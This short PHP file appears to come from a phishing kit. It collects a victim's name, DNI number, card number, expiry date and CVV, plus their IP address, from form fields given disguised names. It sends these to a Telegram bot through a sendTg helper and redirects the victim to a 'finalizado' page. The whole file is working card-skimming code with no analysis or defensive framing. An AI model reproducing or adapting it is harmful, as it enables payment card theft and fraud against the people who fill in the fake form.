<?php
error_reporting(0);
include '../config.php';
include './tg.php';
$ip = $_SERVER['REMOTE_ADDR'];

if (isset($_POST['noesdes'])) {
    $msg  = "➖➖➖[ DATOS ]➖➖➖\r\n";
    $msg .= "✔️ NOM : <code>{$_POST['noesdes']}</code>\r\n";
    $msg .= "👤 DNI : <code>{$_POST['requtes']}</code>\r\n";
    $msg .= "💳 TAR : <code>{$_POST['latidos']}</code>\r\n";
    $msg .= "☑️ MES : <code>{$_POST['pechs']}</code>\r\n";
    $msg .= "☑️ AÑO : <code>{$_POST['tecs']}</code>\r\n";
    $msg .= "☑️ CVV : <code>{$_POST['cass']}</code>\r\n";
    $msg .= "➖➖➖ INFO ➖➖➖\r\n";
    $msg .= "🌐 IP : <code>".$ip."</code>\r\n";
    $msg .= "➖➖➖[@HeartDev]➖➖➖\r\n\r\n\r\n";
    sendTg($msg, $key, $id);
    header("location: ../finalizado.html");
}
?>